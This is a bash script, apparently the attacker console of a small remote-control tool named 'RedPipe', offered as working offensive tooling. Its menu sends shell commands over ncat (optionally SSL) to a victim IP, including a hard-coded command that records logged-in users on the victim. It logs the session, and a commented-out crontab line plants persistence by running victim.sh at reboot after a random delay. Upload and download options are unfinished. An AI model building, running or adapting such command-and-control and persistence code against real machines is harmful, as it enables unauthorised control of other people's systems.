#!/bin/bash

###config
source ./config.cfg

if [ "$SSL_ENABLED" = "true" ]; then
    SSL_OPTS="--ssl"
else
    SSL_OPTS=""
fi



##########


show_menu() {
    clear
    echo "========================================="
    echo "           RedPipe By M0G3H"
    echo "========================================="
    echo "1. Start Server (Attacker)"
    echo "2. Upload File (maintain in progress)"
    echo "3. Download File (maintain in progress)"
    echo "4. Save Connected Clients to victim"
    echo "5. Install Persistence (maintain in progress)"
    echo "6. View Logs"
    echo "7. Exit"
    echo "========================================="
    echo -n "Choose: "
}

while true; do
    show_menu
    read choice
    
    case $choice in
        1)
            echo ""
            echo "[*] Starting Server on port $SERVER_PORT..."
            echo "[*] Ctrl+C to exit"
            	ncat $SSL_OPTS $VICTIM_IP $SERVER_PORT -o RedPipe_log.txt
            ;;
        2)
            echo "maintain in progress"
            #echo -n "[*] enter absolute path of file..."
	        #read file
            #ncat $VICTIM_IP $SERVER_PORT < "$file"
            ;;
        3)
            echo "maintain in progress"
            #echo -n "[*] enter absolute path of file..."
            #ncat $VICTIM_IP $SERVER_PORT < "$file"
            ;;
        4)
            echo "done save as connected_clients.txt in victim"
            echo "who | awk '{print \$1, \$2}' > ./connected_clients.txt" | ncat --ssl 192.168.1.9 8080
            ;;
        5)
            echo "maintain in progress"
            #RANDOM_DELAY=$((RANDOM % 60)); (crontab -l 2>/dev/null; echo "@reboot sleep ${RANDOM_DELAY}m && /home/$(whoami)/RedPipe/victim.sh") | crontab -  | ncat $SSL_OPTS $VICTIM_IP $SERVER_PORT
            #echo "[+] Persistence Done"
            ;;
        6)
            echo ""
            cat ./RedPipe_log.txt
            ;;
        7)
            echo ""
            exit 0
            ;;
        *)
            echo ""
            echo "[-] Invalid choice."
            sleep 1
            ;;
    esac
    
    echo ""
    echo -n "Press Enter to continue..."
    read
done




